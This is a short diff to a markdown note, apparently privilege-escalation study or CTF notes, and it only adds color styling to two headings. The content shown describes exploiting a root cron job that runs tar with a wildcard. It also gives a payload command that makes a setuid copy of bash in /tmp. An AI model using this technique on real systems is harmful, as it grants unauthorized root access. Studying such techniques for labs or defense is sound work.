@@ -14,12 +14,12 @@ crontab -l
 crontab -l -u username
 ```
 
-# compress **everything** wildcard
+# <span style="color:#FF5555">compress **everything** wildcard</span>
 
 `*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *`
 
 The cron job uses `*` (wildcard), meaning **anything inside the folder** will be included — **even files with weird or dangerous names**.
-### Steps
+### <span style="color:#50FA7B">Steps</span>
 1. **create a payload**
 `echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" > /home/andre/backup/exploit.sh`
 2. **Use `chmod +s` to give it the setuid bit**
